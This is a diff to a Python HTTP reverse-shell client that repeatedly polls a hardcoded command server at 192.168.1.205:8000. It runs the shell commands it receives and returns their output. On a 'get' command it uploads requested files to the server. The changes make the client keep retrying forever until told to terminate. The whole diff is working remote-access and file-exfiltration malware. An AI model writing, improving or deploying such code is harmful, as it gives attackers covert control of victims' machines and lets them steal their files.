@@ -3,6 +3,7 @@
 import requests
 import subprocess
 import os
+import time
 
 SERVER_IPADDR = "192.168.1.205"
 PORT = "8000"
@@ -14,14 +15,22 @@ def web_client():
         evilCommand = getResponse.text
 
         if 'terminate' in evilCommand:
+            return 1
             break
         
         elif 'get' in evilCommand:
             getString, filename = evilCommand.split("*")
             if os.path.exists(filename):
-                url_toProcessFile = URL_STRING+"/store"
-                fileObject = {"file": open(filename,"rb")}
+                url_toProcessFile = URL_STRING+"/data"
+                data = b''
+                with open(filename,'rb') as fileObject:
+                    data = fileObject.read()
+
+                fileObject = {"file": data}
                 r = requests.post(url_toProcessFile,files=fileObject)
+                
+                
+             
             else:
                 postResponse = requests.post(URL_STRING,data="File Not Found")
         
@@ -31,4 +40,10 @@ def web_client():
             postResponse = requests.post(URL_STRING,data=shellObject.stderr.read())
 
 if __name__ == "__main__":
-    web_client()
+    while True:
+        try:
+          status = web_client()
+          if status == 1:
+              break
+        except Exception:
+            time.sleep(10)
